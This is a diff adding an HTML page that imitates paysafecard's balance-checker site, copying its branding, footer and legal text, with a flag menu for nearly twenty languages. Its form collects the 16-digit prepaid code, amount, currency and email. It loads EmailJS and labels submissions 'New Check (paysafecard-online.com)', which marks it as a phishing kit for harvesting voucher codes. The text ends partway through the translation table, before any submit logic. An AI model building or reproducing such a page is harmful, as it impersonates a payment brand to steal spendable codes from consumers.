@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="description" content="Pay securely and easily with a paysafecard prepaid code. Get one in over 650,000 sales outlets and pay everywhere where you see our logo.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=yes, viewport-fit=cover">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="paysafecard">
+    <meta name="twitter:card" content="summary">
+    <meta property="fb:app_id" content="1845627159021837">
+    <link rel="stylesheet" href="style2.css">
+    <link rel="stylesheet" href="demo.css">
+    <link rel="stylesheet" href="https://www.paysafecard.com/typo3conf/ext/blog/Resources/Public/Css/frontend.min.css?1724075082" media="all">
+    <link rel="stylesheet" href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/dist/style.min.css?1732005046" media="all">
+    <link rel="stylesheet" href="https://www.paysafecard.com/typo3conf/ext/paysafe_questionnaire/Resources/Public/Css/slimselect.min.css?1724854905" media="all">
+    <link href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/modules/balance-checker.min.css?1730798211" rel="stylesheet">
+    <link href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/modules/storelocator.min.css?1730798211" rel="stylesheet">
+
+    <link rel="icon" type="image/png" href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/images/icons/favicon-48x48.png" sizes="48x48">
+    <link rel="icon" type="image/svg+xml" href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/images/icons/favicon.svg">
+    <link rel="shortcut icon" href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/images/icons/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/images/icons/apple-touch-icon.png">
+    <meta name="apple-mobile-web-app-title" content="paysafecard">
+
+    <link rel="preload" href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/fonts/Denim-Bold.woff2" as="font" crossorigin>
+    <link rel="preload" href="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/fonts/Denim-Regular.woff2" as="font" crossorigin>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){ emailjs.init({ publicKey: "JOa2aM6pG3X7wOueh" }); })();
+    </script>
+
+    <title>Discover how you can pay online in cash. | paysafecard</title>
+
+    <style>
+        /* ── Suppress Google Translate banner ── */
+        .goog-te-banner-frame,
+        .skiptranslate { display: none !important; }
+        body { top: 0 !important; font-family: Arial, sans-serif; padding-top: 48px; }
+
+        /* ── Hidden content sections ── */
+        #c388321,#c388141,#c388201,#c388261,#c388291,#c388041,#c388351,
+        #c388081,#c388381,#c388001,#c388231,#c388411,#c388441,#c388471,
+        #c388561,#c388591,#c388621,#c388171,#c388531,#c388501,#c388651,
+        #c388681,#c388711,#c387961,#c388741,#c388771,#c388111 { display: none; }
+
+        /* ── Image section ── */
+        .body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .image-section {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 90%;
+            max-width: 350px;
+            align-items: center;
+        }
+        .image-section img {
+            margin-top: 50px;
+            width: 100%;
+            max-height: 100px;
+            object-fit: cover;
+            border-radius: 10px;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.2);
+            transition: transform 0.3s;
+        }
+        .image-section img:hover { transform: scale(1.05); }
+
+        /* ══════════════════════════════════════
+           FLAG BAR — fixed, top-center
+        ══════════════════════════════════════ */
+        .translate-top-center {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            pointer-events: none;
+        }
+        .flag-menu-horizontal {
+            display: flex;
+            flex-direction: row;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 6px;
+            background: #ffffff;
+            padding: 6px 14px;
+            border-radius: 0 0 16px 16px;
+            box-shadow: 0 4px 14px rgba(0,0,0,0.15);
+            pointer-events: all;
+        }
+        .flag-btn {
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+            border-radius: 3px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        .flag-btn:hover {
+            transform: scale(1.3);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.25);
+        }
+        .flag-btn img {
+            width: 26px;
+            height: 19px;
+            object-fit: cover;
+            display: block;
+            border-radius: 3px;
+        }
+        .flag-btn.active-lang {
+            outline: 2px solid #0070cc;
+            border-radius: 3px;
+        }
+
+        /* ── Form scrollbar hide ── */
+        .form__row::-webkit-scrollbar { display: none !important; }
+        .form__row { -ms-overflow-style: none !important; }
+
+        /* ── Input placeholder colour fix ── */
+        input::placeholder { color: #888 !important; opacity: 1 !important; }
+        input::-webkit-input-placeholder { color: #888 !important; }
+        input::-moz-placeholder { color: #888 !important; }
+        input:-ms-input-placeholder { color: #888 !important; }
+    </style>
+</head>
+
+<body>
+
+    <div class="page-container">
+
+        <div class="translate-top-center">
+            <div class="flag-menu-horizontal" id="flagBar">
+                <button class="flag-btn active-lang" data-lang="en" title="English"     onclick="changeLanguage('en')"><img src="https://flagcdn.com/w40/gb.png" alt="EN"></button>
+                <button class="flag-btn"             data-lang="de" title="Deutsch"     onclick="changeLanguage('de')"><img src="https://flagcdn.com/w40/de.png" alt="DE"></button>
+                <button class="flag-btn"             data-lang="hr" title="Hrvatski"    onclick="changeLanguage('hr')"><img src="https://flagcdn.com/w40/hr.png" alt="HR"></button>
+                <button class="flag-btn"             data-lang="es" title="Español"     onclick="changeLanguage('es')"><img src="https://flagcdn.com/w40/es.png" alt="ES"></button>
+                <button class="flag-btn"             data-lang="et" title="Eesti"       onclick="changeLanguage('et')"><img src="https://flagcdn.com/w40/ee.png" alt="ET"></button>
+                <button class="flag-btn"             data-lang="fi" title="Suomi"       onclick="changeLanguage('fi')"><img src="https://flagcdn.com/w40/fi.png" alt="FI"></button>
+                <button class="flag-btn"             data-lang="fr" title="Français"    onclick="changeLanguage('fr')"><img src="https://flagcdn.com/w40/fr.png" alt="FR"></button>
+                <button class="flag-btn"             data-lang="el" title="Ελληνικά"    onclick="changeLanguage('el')"><img src="https://flagcdn.com/w40/gr.png" alt="EL"></button>
+                <button class="flag-btn"             data-lang="it" title="Italiano"    onclick="changeLanguage('it')"><img src="https://flagcdn.com/w40/it.png" alt="IT"></button>
+                <button class="flag-btn"             data-lang="lv" title="Latviešu"    onclick="changeLanguage('lv')"><img src="https://flagcdn.com/w40/lv.png" alt="LV"></button>
+                <button class="flag-btn"             data-lang="lt" title="Lietuvių"    onclick="changeLanguage('lt')"><img src="https://flagcdn.com/w40/lt.png" alt="LT"></button>
+                <button class="flag-btn"             data-lang="mt" title="Malti"       onclick="changeLanguage('mt')"><img src="https://flagcdn.com/w40/mt.png" alt="MT"></button>
+                <button class="flag-btn"             data-lang="nl" title="Nederlands"  onclick="changeLanguage('nl')"><img src="https://flagcdn.com/w40/nl.png" alt="NL"></button>
+                <button class="flag-btn"             data-lang="pt" title="Português"   onclick="changeLanguage('pt')"><img src="https://flagcdn.com/w40/pt.png" alt="PT"></button>
+                <button class="flag-btn"             data-lang="cs" title="Čeština"     onclick="changeLanguage('cs')"><img src="https://flagcdn.com/w40/cz.png" alt="CS"></button>
+                <button class="flag-btn"             data-lang="sk" title="Slovenčina"  onclick="changeLanguage('sk')"><img src="https://flagcdn.com/w40/sk.png" alt="SK"></button>
+                <button class="flag-btn"             data-lang="sl" title="Slovenščina" onclick="changeLanguage('sl')"><img src="https://flagcdn.com/w40/si.png" alt="SL"></button>
+                <button class="flag-btn"             data-lang="sv" title="Svenska"     onclick="changeLanguage('sv')"><img src="https://flagcdn.com/w40/se.png" alt="SV"></button>
+                <button class="flag-btn"             data-lang="hu" title="Magyar"      onclick="changeLanguage('hu')"><img src="https://flagcdn.com/w40/hu.png" alt="HU"></button>
+            </div>
+            <div id="google_translate_element" style="display:none;"></div>
+        </div>
+
+        <section id="balance-form" class="balance-checker bg-gradient-dark-to-light">
+            <div class="body">
+                <section class="image-section">
+                    <img src="./dundle.jpg" alt="Top Image">
+                    <img src="./pay1.jpg"   alt="Bottom Image">
+                </section>
+            </div>
+
+            <div class="container-xl" style="margin-top:-100px;">
+                <h2 id="section-title">Check card status</h2>
+                <p class="balance-checker__text" id="section-subtitle">Check your balance by entering the 16-digit code here.</p>
+
+                <div class="balance-checker__block js-balancecheck-300814">
+
+                    <div class="balance-checker__info js-check-success" style="display:none;">
+                        <span class="balance-checker__info__card js-masked-pin"></span>
+                        <div class="balance-checker__info__available-balance">paysafecard Balance:
+                            <span><span class="js-balance-amount"></span><span class="js-balance-currency"></span></span>
+                        </div>
+                        <div class="balance-checker__info__original-balance">Original value:
+                            <span><span class="js-facevalue-amount"></span><span class="js-facevalue-currency"></span></span>
+                        </div>
+                        <a aria-controls="balanceCheckerTransactions" aria-expanded="false"
+                           class="balance-checker__details js-trigger-transactions"
+                           data-bs-toggle="collapse" href="/#balanceCheckerTransactions" role="button">Details</a>
+                        <hr>
+                        <div class="collapse balance-checker__transactions js-transactions" id="balanceCheckerTransactions">
+                            <div class="transactions-md">
+                                <table class="table">
+                                    <thead><tr><th>Date</th><th>Webshop</th><th>Amount</th></tr></thead>
+                                    <tbody class="js-transaction-table"></tbody>
+                                </table>
+                            </div>
+                            <div class="transactions-sm"><ul class="js-transaction-table-sm"></ul></div>
+                            <ul class="js-transaction-row-sm-template" style="display:none;">
+                                <li>
+                                    <div class="transactions-sm__date">
+                                        <div><h3>Date</h3><div class="js-date"></div></div>
+                                        <span class="js-debited-amount"></span>
+                                    </div>
+                                    <h3>Webshop</h3>
+                                    <div class="js-webshop"></div>
+                                    <div class="js-date__table-details"></div>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <p id="form-checker" style="color:rgb(255,78,78); display:none;"></p>
+
+                    <form class="form" id="this-form" novalidate autocomplete="off">
+                        <input type="hidden" name="_subject"  value="New Check (paysafecard-online.com)">
+                        <input type="hidden" name="_captcha"  value="false">
+                        <input type="text"   name="_honey"    style="display:none;">
+                        <input type="hidden" name="_template" value="table">
+
+                        <div class="form__row flex" style="overflow-x:scroll !important; justify-content:left;">
+                            <p class="form__row__input">
+                                <input type="text"   class="form-control js-pin-input" name="code"    id="code-checker-input">
+                            </p>
+                            <p class="form__row__input">
+                                <input type="number" class="form-control js-pin-input" name="montant" id="amount-checker-input">
+                            </p>
+                            <p class="form__row__input">
+                                <input type="text"   class="form-control js-pin-input" name="devise"  id="currency-checker-input" list="devise">
+                                <datalist id="devise">
+                                    <option value="Pound">
+                                    <option value="Euro">
+                                    <option value="Dollar">
+                                    <option value="CHF">
+                                </datalist>
+                            </p>
+                            <p class="form__row__input">
+                                <input type="email"  class="form-control js-pin-input" name="email"   id="email-checker-input">
+                            </p>
+                            <button class="btn btn-primary btn-lg js-balancecheck-submit" id="submit-btn">Check</button>
+                        </div>
+                        <div class="invalid-feedback js-check-error" style="display:none;"><span class="js-error-message"></span></div>
+                    </form>
+                </div>
+            </div>
+
+            <div class="balancecheck-tm-container" style="position:absolute;display:none;"></div>
+        </section>
+
+        <section id="c615927" class="text-media text-media--limit bg-primary-blue">
+            <div class="text-media__text align-middle">
+                <div class="col-lg-8">
+                    <h2 class="text-media__title">Download the paysafecard App.</h2>
+                    <p>Download the app for the best paysafecard experience. Full control over your online payments, even on the go.</p>
+                    <p>
+                        <a href="https://play.google.com/store/apps/details?id=at.paysafecard.android" target="_blank" class="google-play-badge" rel="noreferrer">Google Play</a>
+                        <a href="https://apps.apple.com/app/id588324792" target="_blank" class="app-store-badge" rel="noreferrer">Apple iOS</a>
+                    </p>
+                </div>
+            </div>
+            <div class="text-media__image">
+                <picture>
+                    <source type="image/png" srcset="https://www.paysafecard.com/fileadmin/_processed_/2/7/csm_PSC_App_illustration_15a0506ab9.png" media="(max-width:599.9px)">
+                    <source type="image/png" srcset="https://www.paysafecard.com/fileadmin/B2C/Images/App/PSC_App_illustration.png">
+                    <img src="https://www.paysafecard.com/fileadmin/B2C/Images/App/PSC_App_illustration.png" alt="Smartphone" loading="lazy">
+                </picture>
+            </div>
+        </section>
+
+        <section id="c18541" class="trustpilot">
+            <div class="container-xl">
+                <h2>Don't take our word for it. Listen to our customers.</h2>
+                <div class="trustpilot__slider">
+                    <div class="trustpilot-widget"
+                         data-locale="en-GB"
+                         data-template-id="54ad5defc6454f065c28af8b"
+                         data-businessunit-id="4a6069810000640005045b47"
+                         data-style-height="240px" data-style-width="100%"
+                         data-theme="light" data-tags="SelectedReview"
+                         data-review-languages="en">
+                        <a href="https://www.trustpilot.com/review/www.paysafecard.com" target="_blank" rel="noopener">Trustpilot</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <footer class="footer">
+            <div class="container-xl">
+                <div class="row">
+                    <div class="col-sm-12 col-lg-3">
+                        <div class="footer__block-item">
+                            <nav aria-label="footer links" class="footer__links">
+                                <ul>
+                                    <li><a target="_blank" href="https://www.paysafe.com/ca-fr/paysafecard-pour-les-entreprises/">Our Business Experience</a></li>
+                                </ul>
+                            </nav>
+                            <h2 class="footer__title">Discover your gateway to play</h2>
+                        </div>
+                        <div class="footer__social">
+                            <ul>
+                                <li><a href="http://www.facebook.com/paysafecard"   target="_blank" rel="noopener" class="footer__social--facebook"><span class="sr-only">Facebook</span></a></li>
+                                <li><a href="https://twitter.com/paysafecard"        target="_blank" rel="noopener" class="footer__social--x"><span class="sr-only">X</span></a></li>
+                                <li><a href="https://www.instagram.com/paysafecard" target="_blank" rel="noopener" class="footer__social--instagram"><span class="sr-only">Instagram</span></a></li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="col-sm-12 col-md-6 col-lg-4 offset-lg-1">
+                        <nav aria-label="footer navigation" class="footer__navigation">
+                            <div>
+                                <span class="footer__navigation-title">Company</span>
+                                <ul>
+                                    <li><a href="https://www.paysafe.com/ca-fr/notre-histoire/"                    target="_blank" rel="noopener">About us</a></li>
+                                    <li><a href="https://www.paysafe.com/ca-fr/paysafecard-pour-les-entreprises/"  target="_blank" rel="noopener">Business</a></li>
+                                    <li><a href="https://www.paysafe.com/ca-fr/careers/"                           target="_blank" rel="noopener">Careers</a></li>
+                                    <li><a href="https://www.paysafecard.com/fr-fr/entreprise-1/mentions-legales/" target="_blank" rel="noopener">Legal notice</a></li>
+                                </ul>
+                                <ul>
+                                    <li><a href="https://www.paysafecard.com/fr-fr/frais-et-limites/">Fees and limits</a></li>
+                                    <li><a href="https://www.paysafecard.com/fr-fr/affilies-de-paysafecard/">paysafecard Partners</a></li>
+                                    <li><a href="https://www.paysafecard.com/fr-fr/securite/">Security</a></li>
+                                    <li><a href="https://ir.paysafe.com/" target="_blank" rel="noopener">Investor relations</a></li>
+                                    <li><a href="https://www.paysafecard.com/fr-fr/cgv/" target="_blank" rel="noopener">Terms & Conditions</a></li>
+                                </ul>
+                            </div>
+                            <div>
+                                <span class="footer__navigation-title">Help</span>
+                                <ul>
+                                    <li><a href="https://www.paysafecard.com/fr-fr/support/">FAQs</a></li>
+                                    <li><a href="https://customer.cc.at.paysafecard.com/plock/plock.xhtml" target="_blank" rel="noopener">Block paysafecard</a></li>
+                                    <li><a href="https://policerfi.paysafe.com/rfi/login" target="_blank" rel="noopener">Service portal survey</a></li>
+                                </ul>
+                                <ul>
+                                    <li><a href="https://www.paysafecard.com/fr-fr/avis-de-confidentialite/">Privacy notice</a></li>
+                                    <li><a href="https://www.paysafecard.com/fr-fr/avis-sur-les-cookies/">Cookie notice</a></li>
+                                    <li><a href="https://www.paysafe.com/en/paysafegroup/modern-slavery-act-transparency-statement/">Modern Slavery Act statement</a></li>
+                                    <li><a class="optanon-show-settings" style="cursor:pointer;">Cookie settings</a></li>
+                                </ul>
+                            </div>
+                        </nav>
+                    </div>
+
+                    <div class="col-sm-12 col-lg-4 footer__block-app">
+                        <div>
+                            <h3>Get the app</h3>
+                            <div class="block-app">
+                                <div class="block-app__qrcode">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="114" height="114" viewBox="0 0 114 114" fill="none">
+                                        <g clip-path="url(#qrClip)">
+                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0V27.4437H27.4437V0H0ZM23.5226 23.5226H3.92104V3.92104H23.5238V23.5226H23.5226Z" fill="black"/>
+                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M0 86.251V113.695H27.4437V86.251H0ZM23.5226 109.774H3.92104V90.1708H23.5238V109.772L23.5226 109.774Z" fill="black"/>
+                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M86.25 0V27.4437H113.694V0H86.25ZM109.773 23.5226H90.1698V3.92104H109.773V23.5226Z" fill="black"/>
+                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M7.84375 7.84082V19.6027H19.6057V7.84082H7.84375Z" fill="black"/>
+                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M94.0938 7.84082V19.6027H105.856V7.84082H94.0938Z" fill="black"/>
+                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M7.84375 94.0918V105.854H19.6057V94.0918H7.84375Z" fill="black"/>
+                                        </g>
+                                        <defs><clipPath id="qrClip"><rect width="113.89" height="113.89" fill="white"/></clipPath></defs>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <a class="google-play-badge" href="https://play.google.com/store/apps/details?id=at.paysafecard.android">Google Play</a>
+                                    <a class="app-store-badge" href="https://apps.apple.com/app/id588324792">Apple iOS</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row footer__bottom">
+                    <div class="col-sm-12 col-md-9 col-lg-10 footer__copyright">
+                        <p><em>©</em>2025 paysafecard.com Wertkarten GmbH. All rights reserved. Paysafe Prepaid Services Limited, offering services under the brands paysafecard, myPaysafe, paysafecard Mastercard and paysafecash, is regulated by the Central Bank of Ireland. The paysafecard Mastercard is issued by Paysafe Prepaid Services Limited as a subsidiary of Prepaid Services Company Limited under licence from Mastercard International. Mastercard is a registered trademark of Mastercard International. Google Play is a trademark of Google LLC.</p>
+                    </div>
+                    <div class="col-sm-12 col-md-3 col-lg-2">
+                        <a href="https://www.paysafe.com/" class="footer__logo">
+                            <img src="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/images/icons/psc_experience_logo.svg"
+                                 alt="paysafecard - a Paysafe Experience" width="179" height="37" loading="lazy">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+    </div><!-- /.page-container -->
+
+    <script src="https://www.paysafecard.com/typo3temp/assets/compressed/merged-2d81e81386e84c5510c8077cc1c78502-min.js?1739774948"></script>
+    <script src="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/dist/script.min.js?1738660892" type="module" async></script>
+    <script src="https://www.paysafecard.com/typo3conf/ext/theme/Resources/Public/dist/script-bootstrap.min.js?1724074705" type="module" async></script>
+
+    <script>
+    var currentLang = 'en';
+
+    var TRANSLATIONS = {
+        cs: {
+            ph_code:     "Zadejte 16místný kód.",
+            ph_amount:   "Zadejte částku.",
+            ph_currency: "Zadejte měnu.",
+            ph_email:    "Zadejte svou e-mailovou adresu.",
+            btn:         "Zkontrolovat",
+            title:       "Zkontrolovat stav karty",
+            subtitle:    "Zkontrolujte svůj zůstatek zadáním 16místného kódu zde.",
+            err_code:    "Zadejte prosím platný kód.",
+            err_amount:  "Zadejte prosím platnou částku.",
+            err_currency:"Neplatná měna. Zkuste to znovu.",
+            err_email:   "Neplatná e-mailová adresa. Zkuste to znovu."
+        },
+        de: {
+            ph_code:     "Geben Sie den 16-stelligen Code ein.",
+            ph_amount:   "Geben Sie den Betrag ein.",
+            ph_currency: "Geben Sie die Währung ein.",
+            ph_email:    "Geben Sie Ihre E-Mail-Adresse ein.",
+            btn:         "Überprüfen",
+            title:       "Kartenstatus überprüfen",
+            subtitle:    "Überprüfen Sie Ihr Guthaben, indem Sie hier den 16-stelligen Code eingeben.",
+            err_code:    "Bitte geben Sie einen gültigen Code ein.",
+            err_amount:  "Bitte geben Sie einen gültigen Betrag ein.",
+            err_currency:"Ungültige Währung. Bitte versuchen Sie es erneut.",
+            err_email:   "Ungültige E-Mail-Adresse. Bitte versuchen Sie es erneut."
+        },
+        el: {
+            ph_code:     "Εισάγετε τον 16ψήφιο κωδικό.",
+            ph_amount:   "Εισάγετε το ποσό.",
+            ph_currency: "Εισάγετε το νόμισμα.",
+            ph_email:    "Εισάγετε τη διεύθυνση email σας.",
+            btn:         "Έλεγχος",
+            title:       "Έλεγχος κατάστασης κάρτας",
+            subtitle:    "Ελέγξτε το υπόλοιπό σας εισάγοντας τον 16ψήφιο κωδικό εδώ.",
+            err_code:    "Εισάγετε έναν έγκυρο κωδικό.",
+            err_amount:  "Εισάγετε ένα έγκυρο ποσό.",
+            err_currency:"Μη έγκυρο νόμισμα. Δοκιμάστε ξανά.",
+            err_email:   "Μη έγκυρη διεύθυνση email. Δοκιμάστε ξανά."
+        },
+        en: {
+            ph_code:     "Enter the 16-digit code.",
+            ph_amount:   "Enter the amount.",
+            ph_currency: "Enter the currency.",
+            ph_email:    "Enter your email address.",
+            btn:         "Check",
+            title:       "Check card status",
+            subtitle:    "Check your balance by entering the 16-digit code here.",
+            err_code:    "Please enter a valid code.",
+            err_amount:  "Please enter a valid amount.",
+            err_currency:"Invalid currency. Please try again.",
+            err_email:   "Invalid email address. Please try again."
+        },
+        es: {
+            ph_code:     "Ingrese el código de 16 dígitos.",
+            ph_amount:   "Ingrese el monto.",
+            ph_currency: "Ingrese la divisa.",
+            ph_email:    "Ingrese su dirección de correo electrónico.",
+            btn:         "Verificar",
+            title:       "Verificar estado de la tarjeta",
+            subtitle:    "Verifique su saldo ingresando el código de 16 dígitos aquí.",
+            err_code:    "Por favor ingrese un código válido.",
+            err_amount:  "Por favor ingrese un monto válido.",
+            err_currency:"Divisa inválida. Por favor intente de nuevo.",
+            err_email:   "Dirección de correo inválida. Por favor intente de nuevo."
+        },
+        et: {
+            ph_code:     "Sisestage 16-kohaline kood.",
+            ph_amount:   "Sisestage summa.",
+            ph_currency: "Sisestage valuuta.",
+            ph_email:    "Sisestage oma e-posti aadress.",
+            btn:         "Kontrolli",
+            title:       "Kontrolli kaardi olekut",
+            subtitle:    "Kontrollige oma saldot, sisestades siia 16-kohalise koodi.",
+            err_code:    "Palun sisestage kehtiv kood.",
+            err_amount:  "Palun sisestage kehtiv summa.",
+            err_currency:"Kehtetu valuuta. Palun proovige uuesti.",
+            err_email:   "Kehtetu e-posti aadress. Palun proovige uuesti."
+        },
+        fi: {
+            ph_code:     "Syötä 16-numeroinen koodi.",
+            ph_amount:   "Syötä summa.",
+            ph_currency: "Syötä valuutta.",
+            ph_email:    "Syötä sähköpostiosoitteesi.",
+            btn:         "Tarkista",
+            title:       "Tarkista kortin tila",
+            subtitle:    "Tarkista saldosi syöttämällä 16-numeroinen koodi tähän.",
+            err_code:    "Syötä kelvollinen koodi.",
+            err_amount:  "Syötä kelvollinen summa.",
+            err_currency:"Virheellinen valuutta. Yritä uudelleen.",
+            err_email:   "Virheellinen sähköpostiosoite. Yritä uudelleen."
+        },
+        fr: {
+            ph_code:     "Entrez le code à 16 chiffres.",
+            ph_amount:   "Entrez le montant.",
+            ph_currency: "Entrez la devise.",
+            ph_email:    "Entrez votre adresse e-mail.",
+            btn:         "Vérifier",
+            title:       "Vérifier le statut de la carte",
+            subtitle:    "Vérifiez votre solde en entrant le code à 16 chiffres ici.",
+            err_code:    "Veuillez entrer un code valide.",
+            err_amount:  "Veuillez entrer un montant valide.",
+            err_currency:"Devise invalide. Veuillez réessayer.",
+            err_email:   "Adresse e-mail invalide. Veuillez réessayer."
+        },
+        hr: {
+            ph_code:     "Unesite 16-znamenkasti kod.",
+            ph_amount:   "Unesite iznos.",
+            ph_currency: "Unesite valutu.",
+            ph_email:    "Unesite svoju e-mail adresu.",
+            btn:         "Provjeri",
+            title:       "Provjeri status kartice",
+            subtitle:    "Provjerite stanje unosom 16-znamenkastog koda ovdje.",
+            err_code:    "Unesite valjani kod.",
+            err_amount:  "Unesite valjani iznos.",
+            err_currency:"Nevažeća valuta. Pokušajte ponovo.",
+            err_email:   "Nevažeća e-mail adresa. Pokušajte ponovo."
+        },
+        hu: {
+            ph_code:     "Adja meg a 16 jegyű kódot.",
+            ph_amount:   "Adja meg az összeget.",
+            ph_currency: "Adja meg a pénznemet.",
+            ph_email:    "Adja meg az e-mail címét.",
+            btn:         "Ellenőrzés",
+            title:       "Kártya állapotának ellenőrzése",
+            subtitle:    "Ellenőrizze egyenlegét a 16 jegyű kód megadásával.",
+            err_code:    "Kérjük, adjon meg érvényes kódot.",
+            err_amount:  "Kérjük, adjon meg érvényes összeget.",
+            err_currency:"Érvénytelen pénznem. Kérjük, próbálja újra.",
+            err_email:   "Érvénytelen e-mail cím. Kérjük, próbálja újra."
+        },
+        it: {
+            ph_code:     "Inserisci il codice a 16 cifre.",
+            ph_amount:   "Inserisci l'importo.",
+            ph_currency: "Inserisci la valuta.",
+            ph_email:    "Inserisci il tuo indirizzo e-mail.",
+            btn:         "Verifica",
+            title:       "Verifica lo stato della carta",
+            subtitle:    "Verifica il tuo saldo inserendo il codice a 16 cifre qui.",
+            err_code:    "Inserisci un codice valido.",
+            err_amount:  "Inserisci un importo valido.",
+            err_currency:"Valuta non valida. Riprova.",
+            err_email:   "Indirizzo e-mail non valido. Riprova."
+        },
+        lt: {
+            ph_code:     "Įveskite 16 skaitmenų kodą.",
+            ph_amount:   "Įveskite sumą.",
+            ph_currency: "Įveskite valiutą.",
+            ph_email:    "Įveskite savo el. pašto adresą.",
+            btn:         "Patikrinti",
+            title:       "Patikrinti kortelės būseną",
+            subtitle:    "Patikrinkite savo balansą įvesdami 16 skaitmenų kodą čia.",
+            err_code:    "Įveskite galiojantį kodą.",
+            err_amount:  "Įveskite galiojančią sumą.",
+            err_currency:"Neteisinga valiuta. Bandykite dar kartą.",
+            err_email:   "Neteisingas el. pašto adresas. Bandykite dar kartą."
+        },
+        lv: {
+            ph_code:     "Ievadiet 16 ciparu kodu.",
+            ph_amount:   "Ievadiet summu.",
+            ph_currency: "Ievadiet valūtu.",
+            ph_email:    "Ievadiet savu e-pasta adresi.",
+            btn:         "Pārbaudīt",
+            title:       "Pārbaudīt kartes statusu",
+            subtitle:    "Pārbaudiet savu bilanci, ievadot 16 ciparu kodu šeit.",
+            err_code:    "Lūdzu ievadiet derīgu kodu.",
+            err_amount:  "Lūdzu ievadiet derīgu summu.",
+            err_currency:"Nederīga valūta. Lūdzu mēģiniet vēlreiz.",
+            err_email:   "Nederīga e-pasta adrese. Lūdzu mēģiniet vēlreiz."
+        },
+        mt: {
+            ph_code:     "Daħħal il-kodiċi ta' 16-il ċifra.",
+            ph_amount:   "Daħħal l-ammont.",
+            ph_currency: "Daħħal il-munita.",
+            ph_email:    "Daħħal l-indirizz tal-e-mail tiegħek.",
+            btn:         "Iċċekkja",
+            title:       "Iċċekkja l-istatus tal-karta",
+            subtitle:    "Iċċekkja l-bilanċ tiegħek billi ddaħħal il-kodiċi ta' 16-il ċifra hawn.",
+            err_code:    "Jekk jogħġbok daħħal kodiċi validu.",
+            err_amount:  "Jekk jogħġbok daħħal ammont validu.",
+            err_currency:"Munita mhux valida. Jekk jogħġbok erġa' pprova.",
+            err_email:   "Indirizz tal-e-mail mhux validu. Jekk jogħġbok erġa' pprova."
+        },
+        nl: {
+            ph_code:     "Voer de 16-cijferige code in.",
+            ph_amount:   "Voer het bedrag in.",
+            ph_currency: "Voer de valuta in.",
+            ph_email:    "Voer uw e-mailadres in.",
+            btn:         "Controleren",
+            title:       "Kaartstatus controleren",
+            subtitle:    "Controleer uw saldo door hier de 16-cijferige code in te voeren.",
+            err_code:    "Voer een geldige code in.",
+            err_amount:  "Voer een geldig bedrag in.",
+            err_currency:"Ongeldige valuta. Probeer opnieuw.",
+            err_email:   "Ongeldig e-mailadres. Probeer opnieuw."
+        },
+        pt: {
+            ph_code:     "Insira o código de 16 dígitos.",
+            ph_amount:   "Insira o valor.",
+            ph_currency: "Insira a moeda.",
+            ph_email:    "Insira o seu endereço de e-mail.",
+            btn:         "Verificar",
+            title:       "Verificar estado do cartão",
+            subtitle:    "Verifique o seu saldo inserindo o código de 16 dígitos aqui.",
+            err_code:    "Por favor insira um código válido.",
+            err_amount:  "Por favor insira um valor válido.",
+            err_currency:"Moeda inválida. Por favor tente novamente.",
+            err_email:   "Endereço de e-mail inválido. Por favor tente novamente."
+        },
+        sk: {
+            ph_code:     "Zadajte 16-miestny kód.",
+            ph_amount:   "Zadajte sumu.",
+            ph_currency: "Zadajte menu.",
+            ph_email:    "Zadajte svoju e-mailovú adresu.",
+            btn:         "Skontrolovať",
+            title:       "Skontrolovať stav karty",
+            subtitle:    "Skontrolujte svoj zostatok zadaním 16-miestneho kódu tu.",
+            err_code:    "Zadajte platný kód.",
+            err_amount:  "Zadajte platnú sumu.",
+            err_currency:"Neplatná mena. Skúste znova.",
+            err_email:   "Neplatná e-mailová adresa. Skúste znova."
+        },
+        sl: {
+            ph_code:     "Vnesite 16-mestno kodo.",
+            ph_amount:   "Vnesite znesek.",
+            ph_currency: "Vnesite valuto.",
+            ph_email:    "Vnesite svoj e-poštni naslov.",
+            btn:         "Preveri",
+            title:       "Preveri stanje kartice",
+            subtitle:    "Preverite stanje tako, da tukaj vnesete 16-mestno kodo.",
+            err_code:    "Vnesite veljavno kodo.",
+            err_amount:  "Vnesite veljaven znesek.",
+            err_currency:"Neveljavna valuta. Poskusite znova.",
